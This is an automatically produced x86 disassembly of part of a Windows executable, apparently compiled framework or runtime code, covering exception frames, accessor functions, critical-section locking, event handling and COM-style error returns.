jmp sub_403994
sub_412f98
pop ebx
pop ebp
retn
sub_412fde
jmp sub_403994
sub_412fe5
pop ebx
pop ebp
retn
sub_41302a
jmp sub_403994
sub_413031
pop ebx
pop ebp
retn
sub_41307b
jmp sub_403994
sub_413082
pop esi
pop ebx
pop ebp
retn
sub_4130d6
jmp sub_403994
sub_4130dd
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41320a
jmp sub_403994
sub_4132e0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4138f0
sub_4133d0
jmp sub_403994
sub_41355a
jmp sub_403994
sub_413561
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4135fb
jmp sub_403994
sub_413602
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413621
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41361a
jmp sub_403994
sub_413621
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413684
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41394c
xor edx edx
mov eax ebx
call sub_413910
pop ebx
retn
sub_4136fc
mov eax [ ebp + 0x4 ]
retn
sub_413732
pop ecx
pop edx
pop esi
pop ebx
retn
sub_413780
jmp sub_403994
sub_413787
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41378c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4137a4
xor edx edx
call sub_4137ac
retn
sub_413894
mov edx [ eax + 0x8 ]
dec edx
call sub_4137ac
retn
sub_4139bc
retn
sub_413a76
jmp sub_403994
sub_413a7d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035b4
sub_413b0c
jmp sub_403994
sub_413b13
pop ebx
pop ecx
pop ebp
retn
sub_413b18
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413b6f
jmp sub_403994
sub_413b76
pop ebx
pop ecx
pop ebp
retn
sub_413b7c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413bb8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
retn
sub_413bd0
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413cab
retn
sub_413d50
test edx edx
je r-xdata
xor edx edx
call sub_413d64
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_413e1a
jmp sub_403994
sub_413e21
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413e34
xchg edx eax
call sub_413d64
retn
sub_413e3c
retn
sub_413ed5
jmp sub_403994
sub_413edc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413f32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_414026
jmp sub_403994
sub_414136
jmp sub_403994
sub_41413d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41415a
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_414153
jmp sub_403994
sub_41415a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4141e4
jmp sub_403994
sub_4141fc
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4142b8
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414361
jmp sub_403994
sub_414368
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414374
mov eax [ ebp + 0x4 ]
retn
sub_4143aa
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4143f8
jmp sub_403994
sub_4143ff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4144be
jmp sub_403994
sub_4144c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144e7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fb4
retn
sub_4144e0
jmp sub_403994
sub_4144e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4144f0
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4144f8
xor eax eax
retn
sub_414541
jmp sub_403994
sub_414548
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41465b
jmp sub_403994
sub_414662
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4146f0
jmp sub_403994
sub_4146f7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4147c7
jmp sub_403994
sub_4147ce
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414884
jmp sub_403994
sub_41488b
pop esi
pop ecx
pop ebp
retn
sub_414910
jmp sub_403994
sub_414917
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414934
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
sub_41492d
jmp sub_403994
sub_414934
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4149c0
jmp sub_403994
sub_4149dd
jmp sub_403994
sub_4149e4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414a20
retn
sub_414aa3
jmp sub_403994
sub_414aaa
mov eax [ ebp - 0x8 ]
call sub_4175e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414acf
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_414ac8
jmp sub_403994
sub_414acf
mov esp ebp
pop ebp
retn
sub_414b1f
jmp sub_403994
sub_414b26
pop esi
pop ecx
pop ebp
retn
sub_414b79
jmp sub_403994
sub_414b80
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b88
retn
sub_414c03
jmp sub_403994
sub_414c0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414ca7
jmp sub_403994
sub_414cae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ccb
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
sub_414cc4
jmp sub_403994
sub_414ccb
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414cd0
retn
sub_414d4a
jmp sub_403994
sub_414d51
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d58
mov eax edx
mov edx ecx
call sub_407be4
retn
sub_414d64
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_414d7c
sub_414df4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_414e64
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_414e80
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415074
mov eax [ eax + 0x18 ]
retn
sub_415078
mov eax [ eax + 0x14 ]
retn
sub_415114
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415320
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41535c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415374
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415388
mov edx sub_415374
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_4153d0
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407be4
retn
mov eax edx
mov edx ecx
call sub_407bac
retn
sub_41546c
retn
sub_415764
jmp sub_403994
sub_41576b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4157cc
jmp sub_403994
sub_4157d3
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415818
mov eax [ eax + 0x4 ]
call sub_40813c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415828
mov eax [ eax + 0x4 ]
call sub_408168
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415864
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415a0d
jmp sub_403994
sub_415a6c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415afc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_415b4c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_415d37
jmp sub_403994
sub_415d3e
mov esp ebp
pop ebp
retn
sub_415de8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
retn
sub_415e70
mov [ eax + 0x18 ] edx
retn
sub_415fec
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4106b0
retn
sub_416073
jmp sub_403994
sub_41607a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416126
jmp sub_403994
sub_41612d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4162d1
jmp sub_403994
sub_416323
jmp sub_403994
sub_416342
jmp sub_403994
sub_416349
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416368
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416361
jmp sub_403994
sub_416368
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41640b
jmp sub_403994
sub_416493
jmp sub_403994
sub_4164a0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
pop ebx
retn
sub_4164b8
mov eax [ rw-data ]
call sub_4164a0
retn
sub_4164f0
push ebx
call sub_410568
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4164b8
sub_41665d
jmp sub_403994
sub_416664
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f90
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_416784
jmp sub_403994
sub_41678b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416882
jmp sub_403994
sub_41689f
jmp sub_403994
sub_4168a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4169a4
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4153ec
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416a68
push ebx
mov ebx eax
mov eax ebx
call sub_41841c
cmp al 0x9
sete al
pop ebx
retn
sub_416ac7
jmp sub_403994
sub_416ace
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_416b74
jmp sub_403994
sub_416b7b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416dfa
jmp sub_4036e0
sub_416e26
jmp sub_4036e0
sub_416ec8
jmp sub_4036e0
sub_416f6b
jmp sub_4036e0
sub_417143
jmp sub_4036e0
sub_417185
jmp sub_403994
sub_4171b5
jmp sub_403994
sub_4171bc
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41722b
jmp sub_403994
sub_417302
jmp sub_403994
sub_417309
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4175dc
mov dl 0x1
call sub_416544
retn
sub_41771d
jmp sub_403994
sub_417724
pop ebx
mov esp ebp
pop ebp
retn
sub_41772c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41852c
mov eax [ rw-data ]
call sub_4164a0
pop ebp
retn
j_sub_40380c
jmp sub_40380c
j_sub_40380c#2
jmp sub_40380c
sub_417918
jmp sub_403994
sub_41791f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4179ff
jmp sub_403994
sub_417a06
mov esp ebp
pop ebp
retn
sub_417abe
jmp sub_403994
sub_417ac5
pop ecx
pop ecx
pop ebp
retn
sub_417dc7
jmp sub_403994
sub_417dce
pop ebx
mov esp ebp
pop ebp
retn
sub_418073
jmp sub_403994
sub_41807a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403258
retn
sub_418093
jmp sub_403994
sub_4180b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036e0
sub_4180ee
jmp sub_4036e0
sub_41812d
jmp sub_403994
sub_418134
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418156
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403fb4
retn
sub_41814f
jmp sub_403994
sub_418156
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4181dd
jmp sub_4036e0
sub_41820a
jmp sub_403994
sub_418211
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41821c
push ecx
mov edx esp
mov ecx 0x4
call sub_4169e0
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_4164a0
sub_418329
jmp sub_403994
sub_418330
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41840f
jmp sub_403994
sub_418416
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41846c
jmp sub_403994
sub_418473
pop ebx
pop ecx
pop ebp
retn
sub_4186bb
jmp sub_403994
sub_4186c2
pop ecx
pop ecx
pop ebp
retn
sub_418705
jmp sub_403994
sub_41870c
pop ebx
pop ecx
pop ebp
retn
sub_4187a8
jmp sub_403994
sub_4187af
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41885d
jmp sub_403994
sub_418864
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418870
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418acb
jmp sub_403994
sub_418ad2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418af7
mov eax [ ebp - 0x8 ]
call sub_403258
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_418af0
jmp sub_403994
sub_418af7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b1c
lea eax [ ebp - 0x1c ]
call sub_4055cc
lea eax [ ebp - 0x18 ]
call sub_403f90
retn
sub_418b15
jmp sub_403994
sub_418b1c
pop ebx
mov esp ebp
pop ebp
retn
sub_418d2e
jmp sub_403994
sub_418d35
pop ebx
mov esp ebp
pop ebp
retn
sub_418d88
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415650
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_418da0
test dl dl
je r-xdata
mov dl 0x8
call sub_418f24
retn
mov dl 0x9
call sub_418f24
retn
sub_418e28
mov dl 0x1
call sub_418f24
retn
sub_418e30
xor edx edx
call sub_418f24
retn
sub_418f15
jmp sub_403994
sub_418f1c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418f38
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c608
sub_418f6c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_418f84
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_418f90
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_418f84
sub_4190b6
jmp sub_4036e0
sub_4190e5
jmp sub_403994
sub_41911b
jmp sub_403994
sub_419122
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419141
push rw-data
call LeaveCriticalSection
retn
sub_41913a
jmp sub_403994
sub_419141
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419210
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_4193ec
sub_419270
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41752c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419284
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41752c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419298
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_418db4
retn
sub_4192a4
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_418db4
retn
sub_41954c
xor eax eax
retn
sub_419550
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419558
xor eax eax
retn
sub_41955c
retn
sub_419560
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fe4
pop esi
pop ebx
retn
sub_419574
mov eax [ eax + 0x4 ]
retn
sub_419578
retn
sub_41957c
xor eax eax
retn
sub_419580
retn
sub_419584
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419590
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41959c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_4195a8
retn
sub_4195ac
xchg edx eax
call sub_4171d0
retn
sub_4195b4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41963c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403454
pop esi
retn
sub_419650
retn
sub_419730
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fe4
pop esi
pop ebx
retn
sub_419770
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4198bc
push ebx
mov ebx eax
test dl dl
je r-xdata
and [ ebx + 0x24 ] 0xfb
pop ebx
retn
or [ ebx + 0x24 ] 0x4
pop ebx
retn
sub_4198d0
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403488
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_4198e8
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_419970
retn
sub_4199b8
retn
sub_4199f0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_419a08
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419c2c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
sub_419a50
mov al 0x1
retn
sub_419a54
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419a5c
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_419b04
xor eax eax
retn
sub_419b08
retn
sub_419b34
retn
sub_419bcc
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_419be0
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413650
retn
sub_419d27
jmp sub_4036e0
sub_419d2c
mov ebx 0x1
call sub_403a48
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419d8f
jmp sub_4036e0
sub_419d94
mov ebx 0x80030103
call sub_403a48
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419e12
jmp sub_4036e0
sub_419e17
mov ebx 0x80030009
call sub_403a48
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_419e75
jmp sub_4036e0
sub_419e7a
mov ebx 0x8000ffff
call sub_403a48
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a045
jmp sub_403994
sub_41a056
jmp sub_4036e0
sub_41a05b
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a084
lea eax [ ebp + 0xc ]
call sub_4055cc
retn
sub_41a07d
jmp sub_403994
sub_41a084
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a090
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a09c
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a0a8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a0b4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a123
jmp sub_4036e0
sub_41a128
mov esi 0x8000ffff
call sub_403a48
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a13c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a1a9
jmp sub_403994
sub_41a1b0
mov eax [ rw-data ]
call sub_403258
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a1c0
call sub_412f9c
retn
sub_41a288
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41a42c
jmp sub_403994
sub_41a433
pop ebp
retn
sub_41a4c1
jmp sub_403994
sub_41a4c8
pop ebp
retn
sub_41a791
jmp sub_403994
sub_41a798
pop ebp
retn
sub_41a79c
sub [ rw-data ] 0x1
retn
sub_41b103
add ah cl
jmp sub_41b148
sub_41b3de
inc edx
add [ eax - 0x3bffbe16 ] al
adc eax 0x15f00042
inc edx
add al cl
jmp sub_41b430
sub_41b454
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41b4c8
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41b53c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41b548
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41b628
jmp sub_403994
sub_41b62f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b6bf
jmp sub_403994
sub_41b751
jmp sub_403994
sub_41b758
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b7bc
jmp sub_403994
sub_41b7c3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b82b
jmp sub_403994
sub_41b832
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b8d5
jmp sub_403994
sub_41b8dc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bd34
push 0x33
mov ecx rw-data
call sub_41325c
retn
sub_41bd44
push 0x33
mov ecx rw-data
call sub_41321c
retn
sub_41bd54
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41bd78
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41bf4c
push 0x11
mov ecx rw-data
call sub_41321c
retn
sub_41c08c
push ebx
mov ebx eax
mov eax ebx
call sub_41bd54
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41c146
jmp sub_403994
sub_41c14d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd78
retn
sub_41c163
jmp sub_403994
sub_41c17c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c1d9
jmp sub_403994
sub_41c1e0
pop ebx
pop ecx
pop ebp
retn
sub_41c359
jmp sub_403994
sub_41c381
jmp sub_403994
sub_41c388
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c3f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041f4
pop esi
pop ebx
retn
sub_41c468
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41c3c4
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41c4a4
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41c4dc
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41c50c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41c62a
jmp sub_403994
sub_41c631
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd78
retn
sub_41c647
jmp sub_403994
sub_41c6bd
jmp sub_403994
sub_41c6c4
pop ebx
pop ecx
pop ebp
retn
sub_41c6c8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41c77e
jmp sub_403994
sub_41c790
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403454
sub_41c7a4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41c7d4
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41c8e3
jmp sub_403994
sub_41c8ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd78
retn
sub_41c900
jmp sub_403994
sub_41c979
jmp sub_403994
sub_41c980
pop ebx
pop ecx
pop ebp
retn
sub_41cab1
jmp sub_403994
sub_41cac4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41ce7f
jmp sub_403994
sub_41ce86
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cea8
mov eax [ ebp - 0x8 ]
call sub_4200f8
call sub_41d330
retn
sub_41cea1
jmp sub_403994
sub_41cea8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d330
retn
sub_41cec6
jmp sub_403994
sub_41d0c4
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d320
jmp sub_403994
sub_41d327
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d330
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41d368
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d374
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d4b4
retn
sub_41d57d
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41d594
